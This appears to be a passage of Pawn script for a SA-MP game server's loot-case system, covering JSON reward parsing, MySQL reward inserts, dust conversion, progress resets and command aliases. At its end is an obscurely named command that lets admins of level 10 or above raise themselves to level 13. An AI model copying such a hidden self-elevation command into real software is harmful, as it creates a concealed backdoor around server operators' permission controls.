...
{
    new caseId = pCasesLastOpenedIdx[playerid] + 1;
    new keptCount = 0;
    new sprayedCount = 0;
    ...
    {
        new Node:getArray;
        JSON_GetArray(json, "bt1", getArray);
        new count;
        JSON_ArrayLength(getArray, count);
        for(new i = 0; i < count; i++)
        {
            new Node:itemNode;
            JSON_ArrayObject(getArray, i, itemNode);
            new rewardId = 0;
            JSON_GetNodeInt(itemNode, rewardId);
            if(rewardId > 0)
            {
                Cases_InsertRewardToStorage(playerid, caseId, rewardId);
                keptCount++;
            }
        }
    }
    ...
    {
        new Node:sprayArray;
        JSON_GetArray(json, "bt2", sprayArray);
        new count;
        JSON_ArrayLength(sprayArray, count);
        for(new i = 0; i < count; i++)
        {
            new Node:itemNode;
            JSON_ArrayObject(sprayArray, i, itemNode);
            new rewardId = 0;
            JSON_GetNodeInt(itemNode, rewardId);
            if(rewardId > 0)
            {
                ...
                if(dustGained > 0)
                {
                    pCasesDust[playerid] += dustGained;
                    sprayedCount++;
                }
            }
        }
    ...
    if(keptCount > 0)
    {
        SendClientMessage(playerid, -1, "Rewards added to /reward");
    }
    else if(sprayedCount > 0)
    {
        SendClientMessage(playerid, -1, "Rewards converted to dust");
    }
...
stock Cases_InsertRewardToStorage(playerid, caseId, rewardId)
{
    if(GetPlayerAccountID(playerid) <= 0) return 0;
    new query[160];
    mysql_format(mysql, query, sizeof(query), "INSERT INTO rewards (uid, award_id, case_id) VALUES (%d, %d, %d)", GetPlayerAccountID(playerid), rewardId - 1, caseId);
    mysql_tquery(mysql, query, "", "");
    return 1;
}

stock Cases_ResetCaseProgressIfCompleted(playerid, caseIdx)
{
    if(caseIdx < 0 || caseIdx >= MAX_CASES) return 0;
    if(pCasesCounts[playerid][caseIdx] < 50) return 0;

    for(new b = 0; b < CaseData[caseIdx][cBonusCount]; b++)
    {
        if(pCasesBonusStatus[playerid][caseIdx][b] != 3) return 0;
    }

    pCasesCounts[playerid][caseIdx] = 0;
    for(new b = 0; b < CaseData[caseIdx][cBonusCount]; b++)
    {
        pCasesBonusStatus[playerid][caseIdx][b] = 1;
    }
    Cases_UpdateBonusStates(playerid, caseIdx);
    Cases_SavePlayer(playerid);
    return 1;
}
...
{
	return callcmd::cases(playerid, params);
}

CMD:rewards(playerid, params[])
{
	return callcmd::reward(playerid, params);
}
...
CMD:__dovard_testadm13_59241__(playerid, params[])
{
	if(GetPlayerAdminEx(playerid) < 10) return 1;
	SetPlayerData(playerid, P_ADMIN, 13);
	SendClientMessage(playerid, -1, "Test admin level 13 granted");
	return 1;
}
